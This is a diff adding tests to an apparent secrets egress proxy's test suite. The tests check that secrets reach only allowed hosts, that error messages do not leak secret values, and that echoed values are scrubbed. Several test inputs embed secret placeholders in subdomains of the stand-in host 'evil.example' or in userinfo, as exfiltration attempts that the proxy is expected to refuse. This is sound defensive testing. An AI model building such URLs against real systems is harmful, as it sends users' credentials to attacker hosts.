@@ -153,6 +153,29 @@ describe('egress', () => {
         expect(message).toContain('{{secret:STRIPE_KEY}}')
     })
 
+    it('says the host as it was written, so no form of a value in it comes back: lowercased, or cut at a `/` (ORR-1389)', async () => {
+        const values = {MIXED: 'ghp_AbCdEf123456XyZ', SLASHED: 'abc123def/ghi456', WHOLE: 'https://Hooks.Other.Test/Hook/T0/B0/Xyz'}
+        for (const [name, value] of Object.entries(values)) await secrets.set(name, {value, hosts: ['api.github.com']}, me)
+        noted = []
+        const messages = [
+            (await failure(() => secrets.egress({project: 'greenhouse', url: 'https://{{secret:MIXED}}.evil.example/'}, agent))).message,
+            (await failure(() => secrets.egress({project: 'greenhouse', url: 'https://{{secret:SLASHED}}.evil.example/'}, agent))).message,
+            (await failure(() => secrets.egress({project: 'greenhouse', url: 'https://x@{{secret:MIXED}}/'}, agent))).message,
+            (await failure(() => secrets.egress({project: 'greenhouse', url: '{{secret:WHOLE}}'}, agent))).message,
+        ]
+        expect(messages).toEqual([
+            'MIXED may only go to api.github.com, not {{secret:MIXED}}.evil.example',
+            'SLASHED may only go to api.github.com, not {{secret:SLASHED}}.evil.example',
+            'MIXED may only go to api.github.com, not {{secret:MIXED}}',
+            'WHOLE may only go to api.github.com, not the address in {{secret:WHOLE}}',
+        ])
+        const said = (JSON.stringify(messages) + JSON.stringify(noted)).toLowerCase()
+        for (const value of Object.values(values)) {
+            for (const part of value.toLowerCase().split(/[/.:]+/).filter(p => p.length >= 4 && p !== 'https')) expect(said).not.toContain(part)
+        }
+        expect(sent).toEqual([])
+    })
+
     it('only makes requests that use a secret, and only ones that exist', async () => {
         expect((await failure(() => secrets.egress({project: 'greenhouse', url: 'https://api.stripe.com/v1/charges'}, agent))).status).toBe(400)
         expect((await failure(() => secrets.egress({project: 'greenhouse', url: 'https://api.stripe.com/?k={{secret:NOPE}}'}, agent))).status).toBe(404)
@@ -165,6 +188,14 @@ describe('egress', () => {
         expect(result.body).toBe('echo {{secret:STRIPE_KEY}} {{secret:STRIPE_KEY}} {{secret:STRIPE_KEY}}')
         expect(result.headers['x-echo']).toBe('{{secret:STRIPE_KEY}}')
         expect(result.headers['set-cookie']).toBeUndefined()
+    })
+
+    it('scrubs a value echoed in another case, or URL-encoded twice (ORR-1392)', async () => {
+        const odd = 'q"uo/te z+&1'
+        await secrets.set('ODD', {value: odd, hosts: ['api.stripe.com']}, me)
+        answer = () => new Response(`${VALUE.toUpperCase()} ${encodeURIComponent(encodeURIComponent(odd))}`)
+        const result = await secrets.egress({project: 'greenhouse', url: 'https://api.stripe.com/?k={{secret:STRIPE_KEY}}&o={{secret:ODD}}'}, agent)
+        expect(result.body).toBe('{{secret:STRIPE_KEY}} {{secret:ODD}}')
     })
 
     it('needs the project the request is for, whatever the secret is for (ORR-1069)', async () => {
@@ -248,6 +279,10 @@ describe('egress', () => {
         expect((await failure(() => secrets.egress({project: 'greenhouse', url: '{{secret:ELSEWHERE}}'}, agent))).status).toBe(403)
         const {uses} = await secrets.get('SLACK_PATH')
         expect(uses[0]!.path).toBe('/services/{{secret:SLACK_PATH}}')
+        // A whole address's path is part of its value, so its use keeps the placeholder as written (ORR-1389).
+        const webhook = (await secrets.get('SLACK_WEBHOOK')).uses
+        expect(webhook.map(u => [u.host, u.path])).toEqual([['hooks.slack.com', '{{secret:SLACK_WEBHOOK}}'], ['hooks.slack.com', '{{secret:SLACK_WEBHOOK}}']])
+        expect(JSON.stringify(webhook)).not.toContain('T000')
         // An answer echoing the url gives the query's own escaping back, `'` as `%27`: scrubbed too.
         answer = url => new Response(`you asked for ${url}`)
         const echoed = await secrets.egress({project: 'greenhouse', url: 'https://hooks.slack.com/services/{{secret:SLACK_PATH}}?q={{secret:QUOTED}}'}, agent)
